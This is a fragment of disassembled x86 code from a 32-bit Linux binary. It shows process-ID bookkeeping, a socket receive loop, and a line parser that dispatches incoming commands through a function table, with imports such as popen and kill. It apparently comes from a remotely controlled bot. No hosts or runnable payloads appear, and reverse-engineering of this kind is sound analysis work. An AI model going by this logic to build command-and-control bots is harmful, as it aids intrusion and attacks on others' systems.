cmp dword [var_18h], eax
jb 0x804c361
mov eax, dword [obj.pids]
lea edx, [eax - 4]
mov eax, dword [var_18h]
shl eax, 2
lea eax, [edx + eax]
mov dword [eax], 0
mov eax, dword [obj.numpids]
sub eax, 1
mov dword [obj.numpids], eax
mov eax, dword [obj.numpids]
shl eax, 2
add eax, 4
mov dword [esp], eax
call sym.imp.malloc
mov dword [var_1ch], eax
mov dword [var_18h], 0
jmp 0x804c3fa
mov eax, dword [var_18h]
shl eax, 2
mov ecx, eax
add ecx, dword [var_1ch]
mov eax, dword [var_18h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
mov dword [ecx], eax
add dword [var_18h], 1
mov eax, dword [obj.numpids]
cmp dword [var_18h], eax
jb 0x804c3d7
mov eax, dword [obj.pids]
mov dword [esp], eax
call sym.imp.free
mov eax, dword [var_1ch]
mov dword [obj.pids], eax
add dword [var_28h], 1
mov eax, dword [obj.numpids]
cmp dword [var_28h], eax
jb 0x804c324
mov eax, dword [obj.sock]
mov edx, eax
and edx, 0x1f
mov eax, dword [obj.sock]
shr eax, 5
bt dword [ebp + eax*4 - 0x1c0], edx
setb al
test al, al
je 0x804c295
mov eax, dword [obj.sock]
mov dword [exceptfds], 0
mov dword [writefds], 0x1000
lea edx, [s1]
mov dword [wstatus], edx
mov dword [esp], eax
call sym.imp.recv
mov dword [var_bp_10h], eax
cmp dword [var_bp_10h], 0
jle 0x804c25b
mov eax, dword [var_bp_10h]
mov byte [ebp + eax - 0x19c0], 0
mov dword [wstatus], 0x804d15d
lea eax, [s1]
mov dword [esp], eax
call sym.imp.strtok
mov dword [var_14h], eax
jmp 0x804c65c
mov eax, dword [var_14h]
mov dword [esp], eax
call sym.filter
mov eax, dword [var_14h]
movzx eax, byte [eax]
cmp al, 0x3a
jne 0x804c541
mov dword [var_bp_10h], 0
jmp 0x804c4cf
add dword [var_bp_10h], 1
mov edx, dword [var_bp_10h]
mov eax, dword [var_14h]
mov ecx, 0xffffffff
mov dword [var_19dch], eax
mov eax, 0
cld
mov edi, dword [var_19dch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804c506
mov eax, dword [var_bp_10h]
add eax, dword [var_14h]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804c4cb
mov eax, dword [var_bp_10h]
add eax, dword [var_14h]
mov byte [eax], 0
mov eax, dword [var_14h]
add eax, 1
mov dword [wstatus], eax
lea eax, [dest]
mov dword [esp], eax
call sym.imp.strcpy
mov eax, dword [var_bp_10h]
add eax, dword [var_14h]
add eax, 1
mov dword [wstatus], eax
mov eax, dword [var_14h]
mov dword [esp], eax
call sym.imp.strcpy
jmp 0x804c54c
lea eax, [dest]
mov word [eax], 0x2a
mov dword [var_bp_10h], 0
jmp 0x804c559
add dword [var_bp_10h], 1
mov edx, dword [var_bp_10h]
mov eax, dword [var_14h]
mov ecx, 0xffffffff
mov dword [var_19e0h], eax
mov eax, 0
cld
mov edi, dword [var_19e0h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
cmp edx, eax
jae 0x804c590
mov eax, dword [var_bp_10h]
add eax, dword [var_14h]
movzx eax, byte [eax]
cmp al, 0x20
jne 0x804c555
mov eax, dword [var_bp_10h]
add eax, dword [var_14h]
mov byte [eax], 0
mov eax, dword [var_14h]
mov dword [wstatus], eax
lea eax, [var_5c0h]
mov dword [esp], eax
call sym.imp.strcpy
mov eax, dword [var_bp_10h]
add eax, dword [var_14h]
add eax, 1
mov dword [wstatus], eax
mov eax, dword [var_14h]
mov dword [esp], eax
call sym.imp.strcpy
mov dword [var_bp_10h], 0
jmp 0x804c619
mov eax, dword [var_bp_10h]
mov edx, dword [eax*8 + obj.msgs]
lea eax, [var_5c0h]
mov dword [wstatus], eax
mov dword [esp], edx
call sym.imp.strcasecmp
test eax, eax
jne 0x804c615
mov eax, dword [var_bp_10h]
mov ecx, dword [eax*8 + 0x804e484]
mov edx, dword [obj.sock]
mov eax, dword [var_14h]
mov dword [writefds], eax
lea eax, [dest]
mov dword [wstatus], eax
mov dword [esp], edx
call ecx
add dword [var_bp_10h], 1
mov eax, dword [var_bp_10h]
mov eax, dword [eax*8 + obj.msgs]
test eax, eax
jne 0x804c5cf
mov dword [wstatus], str.ERROR
lea eax, [var_5c0h]
mov dword [esp], eax
call sym.imp.strcasecmp
test eax, eax
je 0x804c25b
mov dword [wstatus], 0x804d15d
mov dword [esp], 0
call sym.imp.strtok
mov dword [var_14h], eax
cmp dword [var_14h], 0
je 0x804c295
mov eax, dword [var_14h]
movzx eax, byte [eax]
test al, al
jne 0x804c4ad
jmp 0x804c295
jmp dword [reloc.strncpy]
jmp dword [reloc.getpid]
jmp dword [reloc.getppid]
jmp dword [reloc.srand]
jmp dword [reloc.waitpid]
jmp dword [reloc.strtok]
jmp dword [reloc.strcasecmp]
push ebp
mov ebp, esp
sub esp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
leave
ret
jmp dword [reloc.__errno_location]
jmp dword [reloc.sprintf]
jmp dword [reloc.popen]
jmp dword [reloc.inet_network]
jmp dword [reloc.toupper]
jmp dword [reloc.fgets]
jmp dword [reloc.ntohl]
jmp dword [reloc.feof]
jmp dword [reloc.sleep]
jmp dword [reloc.setsockopt]
jmp dword [reloc.kill]
jmp dword [reloc.pclose]
